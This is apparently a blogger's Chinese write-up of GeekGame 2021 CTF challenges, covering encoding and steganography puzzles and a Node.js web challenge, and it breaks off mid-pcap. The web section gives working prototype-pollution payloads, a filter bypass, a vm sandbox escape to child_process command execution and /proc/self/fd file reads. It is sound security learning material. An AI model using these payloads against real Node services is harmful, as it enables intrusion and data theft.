Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. 可恶的 ook 编码，解码 得到第一个 flag flag{y0u_h4ve_f0rgott3n_7oo_much} 抢了个一血，好耶！ 幻夢界再看这个音频，发现有个奇怪的字符串 aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy 或者格式工厂啥的看下信息。 General Complete name : LeafsNewSong.mp3 Format : MPEG Audio File size : 4.30 MiB Duration : 58 s 70 ms Overall bit rate mode : Constant Overall bit rate : 320 kb/s Album : Secret in Album Cover!! Track name : 叶子的新歌 Track name/Total : aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy Performer : 叶子 Writing library : Lavf58.45.100 Cover : Yes Cover type : Cover (front) Cover MIME : image/png TSS : Logic Pro X 10.7.0 iTunNORM : 0000072C 00000736 00003208 00003140 00009E92 0000501A 00006703 00007E86 00007678 00007E1F iTunSMPB : 00000000 00000210 000007A5 00000000002709CB 00000000 002350D1 00000000 00000000 00000000 00000000 00000000 00000000 USLT : 空无一人的房间 / 我望向窗外 / 想回到昨天 / / 琥珀色的风 / 能否将 回忆传到那边 / 闪烁的星 / 照亮夜空 连成我的思念 / / 你 在梦的另一边 / 站在 日落的地平线 / 背离这世界而去 / 想 在回不去的时间里 / 遇见你 遇见你 遇见你 / 遇见你 遇见你 遇见你 comment : 你还记得吗？小时候，我家和你家都在一个大院里。放学以后，我们经常一起在院子里玩。你虽然是个女孩子，但总是能和男孩子们玩到一块去。 / / 夏天的时候我们挖蚯蚓、捉蚂蚱；冬天，院子里的大坡上积了一层雪，我们就坐在纸箱子压成的雪橇上，一次次从坡顶滑到坡底。那个时候你还发现，坐在铁簸箕上滑得更快。 / / ——当然，那次你也摔得挺惨的。 Audio Format : MPEG Audio Format version : Version 1 Format profile : Layer 3 Format settings : Joint stereo / MS Stereo Duration : 58 s 70 ms Bit rate mode : Constant Bit rate : 320 kb/s Channel(s) : 2 channels Sampling rate : 44.1 kHz Frame rate : 38.281 FPS (1152 SPF) Compression mode : Lossy Stream size : 2.22 MiB (52%) base64 http://lab.maxxsoft.net/ctf/legacy.tbz2 下载下来内容如下。 （怎么比赛的时候就没想到去启动啊，根本没注意到还有引导啊 新建一个虚拟机，配置软驱启动 然后就可以拿到 flag2 了。 还给了个 final password: ItsMeMrLeaf 当然也可以试试拿 qemu 启动 qemu-system-x86_64 -drive format=raw,file=To_the_past.img 夢と現の境界再看 img 里的内容 密码是：宾驭令诠怀驭榕喆艺艺宾庚艺怀喆晾令喆晾怀 或者用 VMware 把软驱以镜像的方式挂载进去 直接试发现不行，查了一下发现是纸币箱号的暗语（？ 解释箱号分二步，第一步是把暗码转成明码，第二步是按明码进行查解，得到你要的数据。 第五套人民币： 例：06 玑驭喆诠 329606：代表是2006年生产的此卷；玑：代表面值，是一个带栽王旁的字，玑是一元，玮是十元，奇谈的我没见过。驭喆诠：这是一个暗语，翻译是艺=1 驭=2 令=3 怀=4 庚=5 诠=6 宾=7 晾=8 喆=9 榕=10也就是0驭喆诠就是296号怀宾就是47号。3296：钱币的流水号。 https://zhidao.baidu.com/question/400192266.html 顺便，第四套： 例：00位打扎拉 1348 00：代表是2000年生产的此卷； 位：代表面值，是一个带单人旁的字，付是一角，位是二角，信是五角，仁是一元，伙是二元，佳士五元，大面值的我没见过，也用不到吧。 打扎拉：这是几个由提手旁组成的，是一个暗语，翻译是 扎-1 打-2 扛-3 抖-4 拉-5 持-6 捎-7 接-8 揖-9 搞-10也就是0 那么打扎拉就是215 再如持打搞就是620 扎就是1号 1348：钱币的流水号。 所以上面的字翻译成明语就是2000年二角215号，流水号1348 三版也一样，例：98公引乘徘振 0867 98：代表是1998年生产的此卷； 公：代表面值，公式一分，其他的的我没见过。 引乘徘振：这是一个暗语，翻译是 引-1 什-2 壮-3 扶-4 作-5 祥-6 振-7 徘-8 湃-9 乘-10也就是0 引乘徘振就是1087号 引引作就是115号 0867：钱币的流水号。 d = dict(艺=1,驭=2,令=3,怀=4,庚=5,诠=6,宾=7,晾=8,喆=9,榕=0) s = \"宾驭令诠怀驭榕喆艺艺宾庚艺怀喆晾令喆晾怀\" for i in s: print(d[i], end=\"\") 得到 72364209117514983984，解压。 红白机啊。。下了个 FCEUX.EXE 模拟器，又找了个经典红白机的游戏合集 【红白机完全档案】全红白机FC游戏合集（三） ，发现模拟的文件是 .nes，这个不对啊…… 再看 readme，找不同。。 left/right 对比 再随便看个 .nes 的文件 4E45531A，草，就是把差异的部分提取出来嘛。 想了半天不知道怎么 diff 导出到文件比较好。最后先拿 010 editor 做了个 diff，导出到 csv，然后写了个脚本提取左右差异的部分，导出到 bin 文件。 最后再拿 fceux 模拟器跑一跑，然而不知道为啥我导出来的 binary 文件跑不起来，界面一片灰。估计哪里 diff 锅了吧（？ 后面再来复现（咕 Flag即服务 You 酱听说最近 *aaS 概念十分火热，无论什么都可以做成开放的 API，就像连接着每个设备的一条分布式软总线，可以跨越编程语言和操作系统的限制，实现任何想做的功能。有了 *aaS，我们就离元宇宙更近一步了呢。 受此鼓舞，You酱用一天时间开发出了震撼人心的新项目 JSON-as-a-Service，要解决困扰全世界开发者几十年的 JSON 格式转换难题。 她在自己保存 Flag 的服务器上部署了这个服务，并发给你了一个链接，想请你体验一下。 零·获得代码 这里的 dockerfile 提示了我们这个提供的文件在 data 目录下 FROM node:14 WORKDIR /usr/src/app COPY path/to/server_source_code . COPY path/to/demo.json data/ RUN npm install EXPOSE 3001 CMD [ \"npm\", \"start\" ] 那试试能不能跨目录读取呢？ nodejs，那就读下 package.json {\"name\":\"demo-server\",\"version\":\"1.0.0\",\"description\":\"\",\"scripts\":{\"start\":\"node --max-http-header-size=32768 start.js\"},\"author\":\"You\",\"license\":\"WTFPL\",\"dependencies\":{\"jsonaas-backend\":\"https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz\"}} 读其他文件会说 Cannot parse file as JSON!，所以直接下载下来看源码吧。 index.js const express = require('express'); const session = require('express-session'); const helmet = require('helmet'); const fs = require('fs'); const {getflag} = require('./getflag'); const {safe_eval} = require('./safe_eval'); let FLAG0 = getflag('flag0.txt'); let FLAG1 = getflag('flag1.txt'); let FLAG2 = getflag('flag2.txt'); const MAX_LENGTH = 4096; const app = express(); app.use(helmet()); app.use(session({ secret: 'ctl7nk2s170srnivd4r7vj9rh5dv4dgi', resave: false, saveUninitialized: false, })); app.use((req, res, next)=&gt;{ if(req.path.toLowerCase().endsWith('settings')) res.send('this feature is currently under development :('); else next(); }); app.get('/', (req, res)=&gt;{ res.sendFile('readme.html', {root: '.'}); }); function waf(str) { for(let bad_name of Object.getOwnPropertyNames(({}).__proto__)) if(str.indexOf(bad_name)!==-1) return true; return false; } app.get('/api/:path(*)', (req, res)=&gt;{ let path = 'data/'+req.params.path; let in_path = req.query.in_path||''; let out_path = req.query.out_path||''; let prefix = req.session.prefix ? (req.session.prefix+'/') : ''; let eval_mode = req.session.eval_enabled===1; if(waf(in_path) || waf(out_path) || waf(prefix)) { res.send('Bad parameter!'); return; } if(!fs.existsSync(path)) { res.send('File does not exists!'); return; } let data = fs.readFileSync(path); if(data.length&gt;MAX_LENGTH) { res.send('File too big!'); return; } try { data = JSON.parse(data); } catch(_) { res.send('Cannot parse file as JSON!'); return; } in_path = prefix + in_path; in_path = in_path.split('/').filter(x=&gt;x!==''); for(let term of in_path) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); if(data[term]===undefined) data[term] = {}; data = data[term]; } if(!JSON.stringify(data)) { res.send('Bad data!'); return; } let output = {}; out_path = prefix + out_path; out_path = out_path.split('/').filter(x=&gt;x!==''); if(out_path.length===0) output = data; else { let cur = output; for(let term of out_path.slice(0, out_path.length-1)) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } // no eval for out_path :) /* if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); */ if(cur[term]===undefined) cur[term] = {}; cur = cur[term]; } cur[out_path[out_path.length-1]] = data; } res.json(output); }); app.get('/activate', (req, res)=&gt;{ if(req.query.code===FLAG1) req.session.activated = 1; if(req.session.activated) res.send(`You have been activated. Activation code: ${FLAG1}`); else res.send('Wrong activation code :('); }); app.get('/eval_settings', (req, res)=&gt;{ if(req.session.activated!==1) { res.send('Eval feature requires activation :('); return; } req.session.eval_enabled = req.query.eval==='on' ? 1 : 0; res.send(`Eval set to ${req.session.eval_enabled}`); }); app.get('/prefix_settings', (req, res)=&gt;{ if(req.session.activated!==1) { res.send('Prefix feature requires activation :('); return; } if(waf(req.query.prefix)) { res.send('Bad prefix!'); return; } req.session.prefix = req.query.prefix; res.send(`Prefix set to \"${req.session.prefix}\"`); }); module.exports = function start_server(port) { if(FLAG0!==`flag{${0.1+0.2}}`) return; FLAG2 = null; app.listen(port, ()=&gt;{ console.log(`server started on :${port}`); }); } flag0 flag{0.30000000000000004} 壹·开通会员再看 flag1 相关的源码。 app.get('/activate', (req, res)=&gt;{ if(req.query.code===FLAG1) req.session.activated = 1; if(req.session.activated) res.send(`You have been activated. Activation code: ${FLAG1}`); else res.send('Wrong activation code :('); }); 很明显是要 原型链污染 了。 这里需要 req.session.activated 不为假就行，而这个参数本身是没定义过的，于是就会往上一层去找，所以可以直接污染 Object，让 Object.activated 有值就行。 再看源码。 in_path = prefix + in_path; in_path = in_path.split('/').filter(x=&gt;x!==''); for(let term of in_path) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); if(data[term]===undefined) data[term] = {}; data = data[term]; } if(!JSON.stringify(data)) { res.send('Bad data!'); return; } let output = {}; out_path = prefix + out_path; out_path = out_path.split('/').filter(x=&gt;x!==''); if(out_path.length===0) output = data; else { let cur = output; for(let term of out_path.slice(0, out_path.length-1)) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } // no eval for out_path :) /* if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); */ if(cur[term]===undefined) cur[term] = {}; cur = cur[term]; } cur[out_path[out_path.length-1]] = data; } res.json(output); 这里过滤了不能有 _，且在 waf 里也遍历了输入的 str.indexOf 是否存在和 ({}).__proto__ 所包含的属性。看起来很好地过滤了原型链，实际上并不是。 （然而喵喵却调了老半天…… 这个 indexOf，其实不仅仅 Sting 有，Array 也有，只要咱传个数组进去，就匹配不到这些属性名称了。 这个 trick 还是今年东华杯的一道 web 中的见到的，赛后看其他师傅 wp 学到的（ 然而，还不能用 __proto__，但其实能用 constructor.prototype. 再回到源码，为了完成这个赋值，out_path 通过 cur = cur[term]; 依次往 {} 内层嵌套赋值，再把最后的结果从读取到的 JSON 文件里取 in_path 相应的值。于是就可以通过 / 来分割每一个 .，也就是构造 constructor/prototype/xxx 这样就行了。 这里只需要 activated 不为假，那随便整个 demo.js 里的东西赋值过去就完事了。 唉，本地调了老半天……可以看到这个 req.session.activated 就被设置了。还是太菜了。 然后打远程。 payload: GET /api/demo.json?in_path=1&amp;out_path[]=constructor/prototype/activated 再访问 /activate flag{I-Can-activate-FRom-Prototype} 抢了个二血（可恶，一血没了，呜呜 贰·为所欲为那接下来就是要让 req.session.eval_enabled===1。 在想去哪找个1呢？前面那个 package.json 里正好有，来试试行不行。 尝试构造 payload: GET /api/../package.json?in_path=version/0&amp;out_path[]=constructor/prototype/eval_enabled 然而发现不大行，他是 ===，这个 string 绕不过……得找个 int 的 1. 试了试，发现 Object.length === 1. 于是可以用 {}[\"constructor\"][\"length\"] 来得到1. GET /api/demo.json?in_path[]=0/constructor/length 然后改改上面的 payload GET /api/demo.json?in_path[]=0/constructor/length&amp;out_path[]=constructor/prototype/eval_enabled 再看参数，现在 eval_enabled 就变为数字的 1 了。 这里发现有点锅，得重启一下。 关于 Web 题目环境 为了避免选手之间互相干扰，Web 题目为每个选手分配一个独立的后端环境。 点击 “打开/下载题目” 时，将会访问启动器（网址形如 prob**-manager.geekgame.pku.edu.cn/docker-manager/start?...），这个系统将启动一个该题的后端环境（域名形如 prob**-xxxxxxxx.geekgame.pku.edu.cn），并将选手重定向过去。 持续 15 分钟没有人访问时，后端环境将自动关闭。下次点击 “打开/下载题目” 时会重新启动一个新的环境。 如果环境出现问题，选手可以将启动器网址的 /start 改成 /stop 来手动关闭题目。 手动关闭后需要等待一分钟方可重新启动。 所有 Web 题目环境均没有外网，因此无法反弹 Shell。 via https://geekgame.pku.edu.cn/faq/ https://prob11-manager.geekgame.pku.edu.cn/docker-manager/stop?&lt;your_token&gt; https://prob11-manager.geekgame.pku.edu.cn/docker-manager/start?&lt;your_token&gt; 然后会分配一个新的 docker 环境。。 现在就能执行代码了。 赛后看其他师傅的 wp，发现其实那个 url 里的 settings 过滤，直接加个 / 就能绕过了，也就是 GET /eval_settings/?on=1 记得先访问一下这个让 req.session.activated = 1。 /activate?code=flag{I-Can-activate-FRom-Prototype} 然后就能 eval 了。 再看咋 RCE 呢。 if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); safe_eval.js const child_process = require('child_process'); const CLIENT_CODE = ` const vm = require(\"vm\"); const code = __USERCODE__; console.log(vm.runInNewContext(code, {})); `; const TIMEOUT_MS = 1000; function safe_eval(s) { let code = CLIENT_CODE.replace('__USERCODE__', JSON.stringify(s)); try { let stdout = child_process.execFileSync('/usr/local/bin/node', ['-'], { input: code, env: {}, timeout: TIMEOUT_MS, encoding: 'utf-8', killSignal: 'SIGTERM', }); return stdout.trim(); } catch(_) { return s; } } module.exports = { safe_eval: safe_eval, }; 想到可以 用 JSFuck 来绕过这个 regex。 但是，发现由于是在 header 里传的，太长了就不行了直接 431 了。 先不管这个，接下来就是 vm 逃逸，这个其实相对 vm2 而言还挺简单，直接运行 this.constructor.constructor('return this.process.env')() 就能拿到主函数的上下文环境。 执行系统命令就可以用 this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString() 这里读文件的话就可以直接用 fs，this.constructor.constructor(\"require('fs').readFileSync('/proc/xxxx/fd/xx')\") 大概这样。 然而，其实还有个问题，**FLAG2 已经被设为 null 了，而且文件已经被 unlink 删了**。 getflag.js const fs = require('fs'); const crypto = require('crypto'); function getflag(path) { let f; try { f = fs.openSync(path); } catch(e) { //return 'failed'; throw e; } let content = fs.readFileSync(f, {encoding: 'utf-8'}).trim(); fs.unlinkSync(path); return content; } module.exports = { getflag: getflag, }; 但是，他 fs 没 close 啊！！！！ 我们还是可以从主程序的 fd（file descriptor）里拿到的！ 也就是 /proc/self/fd/xx，可能要爆破一下，当然也可以本地跑起来看看。 这时又想了想是不是从 env 去打，也就是 fork 新进程的时候通过环境变量来执行命令，参考 NCTF 2020 的 PackageManager_v1.0 一题。 但发现这题里 env: {} 已经赋值为空了，不能通过污染原型链来赋值了…… 呜呜呜。 于是又回来考虑 jsfuck 的问题，这题这一问本来还想抢一血的，结果从第一天做到了最后一天也没解出来，最后发现果然要优化 jsfuck 啊，好气啊！ TODO Extensive Reading: Harekaze 2019 “[a-z().]” (200) 翻车的谜语人 作为曾担任上届比赛命题工作的资深谜语人，You 酱这次也被邀请来出一道考察信息隐写的 Misc 题目。You 酱找组委会确认了本届劳务费能否准时发放后就迅速开工了，但她不知道，这其实是一个彻彻底底的陷阱。 事实上，组委会曾在几个月前收到了报告，称 You 酱或违反规定在题目里私自掺杂大量私货，但这只是个猜想，不一定对。于是，组委会在邀请 You 酱命题的同时，派出间谍麻里奈小姐持续关注 You 酱的一举一动，希望能够发现决定性的证据。 麻里奈小姐不负众望，通过量子波动算法截获了一段 You 酱访问境外服务器的流量记录。现在她想让你来帮忙分析其中的端倪。 flag1是个流量包，打开一看。 这一看就是 jupyter notebook 吧（ 分别得到 {\"type\":\"notebook\",\"content\":{\"cells\":[{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"import zwsp_steg\\nfrom Crypto.Random import get_random_bytes\",\"execution_count\":26,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"import binascii\",\"execution_count\":27,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"def genflag():\\n return 'flag{%s}'%binascii.hexlify(get_random_bytes(16)).decode()\",\"execution_count\":28,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"flag1 = genflag()\\nflag2 = genflag()\",\"execution_count\":29,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"key = get_random_bytes(len(flag1))\",\"execution_count\":30,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"key\",\"execution_count\":31,\"outputs\":[{\"output_type\":\"execute_result\",\"execution_count\":31,\"data\":{\"text/plain\":\"b'\\\\x1e\\\\xe0[u\\\\xf2\\\\xf2\\\\x81\\\\x01U_\\\\x9d!yc\\\\x8e\\\\xce[X\\\\r\\\\x04\\\\x94\\\\xbc9\\\\x1d\\\\xd7\\\\xf8\\\\xde\\\\xdcd\\\\xb2Q\\\\xa3\\\\x8a?\\\\x16\\\\xe5\\\\x8a9'\"},\"metadata\":{}}]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"def xor_each(k, b):\\n assert len(k)==len(b)\\n out = []\\n for i in range(len(b)):\\n out.append(b[i]^k[i])\\n return bytes(out)\",\"execution_count\":32,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"encoded_flag1 = xor_each(key, flag1.encode())\\nencoded_flag2 = xor_each(key, flag2.encode())\",\"execution_count\":33,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"with open('flag1.txt', 'wb') as f:\\n f.write(binascii.hexlify(encoded_flag1))\",\"execution_count\":35,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"\",\"execution_count\":null,\"outputs\":[]}],\"metadata\":{\"kernelspec\":{\"name\":\"python3\",\"display_name\":\"Python 3 (ipykernel)\",\"language\":\"python\"},\"language_info\":{\"name\":\"python\",\"version\":\"3.8.3rc1\",\"mimetype\":\"text/x-python\",\"codemirror_mode\":{\"name\":\"ipython\",\"version\":3},\"pygments_lexer\":\"ipython3\",\"nbconvert_exporter\":\"python\",\"file_extension\":\".py\"}},\"nbformat\":4,\"nbformat_minor\":4}} {\"name\": \"flag1.txt\", \"path\": \"flag1.txt\", \"last_modified\": \"2021-11-06T07:43:20.952991Z\", \"created\": \"2021-11-06T07:43:20.952991Z\", \"content\": \"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44\", \"format\": \"text\", \"mimetype\": \"text/plain\", \"size\": 76, \"writable\": true, \"type\": \"file\"} 是简单的 xor，然后按照原来的代码简单还原一下就行。 from os import fspath # import zwsp_steg from Crypto.Random import get_random_bytes import binascii def genflag(): return 'flag{%s}' % binascii.hexlify(get_random_bytes(16)).decode() flag1 = genflag() flag2 = genflag() key = get_random_bytes(len(flag1)) key # b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9' key1 = b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9' def xor_each(k, b): assert len(k) == len(b) out = [] for i in range(len(b)): out.append(b[i] ^ k[i]) return bytes(out) encoded_flag1 = xor_each(key, flag1.encode()) encoded_flag2 = xor_each(key, flag2.encode()) with open('flag1.txt', 'wb') as f: f.write(binascii.hexlify(encoded_flag1)) # flag1.txt # 788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44 flag1_en = binascii.unhexlify(\"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44\") flag1_de = xor_each(flag1_en, key1) print(flag1_de) # b'flag{9d9a9d92dcb1363c26a0c29fda2edfb6}' flag2 save 一下，发现这个 7z 里面还得要密码。 strings 看一眼，发现了压缩的过程，很明显这个应该是在 terminal 里进行的，是通过 websocket 进行交互。 先过滤 websocket，然后 tcp.stream eq 11 [\"setup\", {}].`[\"stdout\", \"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"].j[\"stdout\", \"\\r\\u001b[K\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"]..[\"stdout\", \"p\"]..[\"stdout\", \"i\"]..[\"stdout\", \"p\"]..[\"stdout\", \"3\"]..[\"stdout\", \" \"]..[\"stdout\", \"i\"]..[\"stdout\", \"n\"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"a\"]..[\"stdout\", \"l\"]..[\"stdout\", \"l\"]..[\"stdout\", \" \"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"e\"]..[\"stdout\", \"g\"]..[\"stdout\", \"o\"]..[\"stdout\", \"-\"]..[\"stdout\", \"l\"]..[\"stdout\", \"s\"]..[\"stdout\", \"b\"]..[\"stdout\", \"\\r\\n\"].N[\"stdout\", \"Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple\\r\\n\"].&amp;[\"stdout\", \"Collecting stego-lsb\\r\\n\"].~..[\"stdout\", \" Downloading https://pypi.tuna.tsinghua.edu.cn/packages/8a/2b/5be4be36ccb3788f1443805583f9ab8182f88f15143778a72dc259b54557/stego_lsb-1.3.1.tar.gz (10 kB)\\r\\n\"].&gt;[\"stdout\", \" Preparing metadata (setup.py) ... \\u001b[?25l-\"]..[\"stdout\", \"\\b \\bdone\\r\\n\"].~..[\"stdout\", \"\\u001b[?25hRequirement already satisfied: Click&gt;=7.0 in /usr/local/lib/python3.8/dist-packages (from stego-lsb) (8.0.1)\\r\\n\"].y[\"stdout\", \"Requirement already satisfied: Pillow&gt;=5.3.0 in /usr/lib/python3/dist-packages (from stego-lsb) (6.2.1)\\r\\n\"].z[\"stdout\", \"Requirement already satisfied: numpy&gt;=1.15.4 in /usr/lib/python3/dist-packages (from stego-lsb) (1.17.4)\\r\\n\"].C[\"stdout\", \"Building wheels for collected packages: stego-lsb\\r\\n\"].H[\"stdout\", \" Building wheel for stego-lsb (setup.py) ... \\u001b[?25l-\"]..[\"stdout\", \"\\b \\bdone\\r\\n\"].~.*[\"stdout\", \"\\u001b[?25h Created wheel for stego-lsb: filename=stego_lsb-1.3.1-py2.py3-none-any.whl size=12135 sha256=20d5395e597058e6e37da40acc32a1c876fc7f334c671591c422b048e38cb5f2\\r\\n Stored in directory: /root/.cache/pip/wheels/ee/b5/10/f779bd3e1c420586ef8cc2cb8768073362f51e3024e7116cc3\\r\\n\"]..[\"stdout\", \"Successfully built stego-lsb\\r\\n\"].:[\"stdout\", \"Installing collected packages: stego-lsb\\r\\n\"].~.,[\"stdout\", \"Successfully installed stego-lsb-1.3.1\\r\\n\\u001b[33mWARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv\\u001b[0m\\r\\n\"].`[\"stdout\", \"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"e\"]..[\"stdout\", \"g\"]..[\"stdout\", \"o\"]..[\"stdout\", \"-\"]..[\"stdout\", \"l\"]..[\"stdout\", \"\\u0007\"]..[\"stdout\", \"s\"]..[\"stdout\", \"b\"]..[\"stdout\", \" \"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"l\"]..[\"stdout\", \"s\"]..[\"stdout\", \"b\"]..[\"stdout\", \" \"]..[\"stdout\", \"w\"]..[\"stdout\", \"a\"]..[\"stdout\", \"v\"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"e\"]..[\"stdout\", \"g\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"h\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"i\"]..[\"stdout\", \" \"]..[\"stdout\", \"k\"]..[\"stdout\", \"i\"]..[\"stdout\", \"-\"]..[\"stdout\", \"ringtrain.wav \"]..[\"stdout\", \"-\"]..[\"stdout\", \"s\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", \"l\"]..[\"stdout\", \"a\"]..[\"stdout\", \"g\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]..[\"stdout\", \"t\"]..[\"stdout\", \"xt \"]..[\"stdout\", \"-\"]..[\"stdout\", \"o\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", \"l\"]..[\"stdout\", \"\\u0007ag\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]..[\"stdout\", \"txt \"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"w\"]..[\"stdout\", \"a\"]..[\"stdout\", \"v\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"n\"]..[\"stdout\", \" \"]..[\"stdout\", \"1\"]..[\"stdout\", \"\\r\\n\"].8[\"stdout\", \"Using 1 LSBs, we can hide 297712 bytes\\r\\n\"].9[\"stdout\", \"Files read in 0.00s\\r\\n\"].9[\"stdout\", \"76 bytes hidden in 0.01s\\r\\n\"].9[\"stdout\", \"Output wav written in 0.00s\\r\\n\"].`[\"stdout\", \"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"]..[\"stdout\", \"7\"]..[\"stdout\", \"z\"]..[\"stdout\", \"a\"]..[\"stdout\", \" \"]..[\"stdout\", \"a\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", \"l\"]..[\"stdout\", \"a\"]..[\"stdout\", \"g\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]....[\"stdout\", \"7\"]..[\"stdout\", \"z\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", 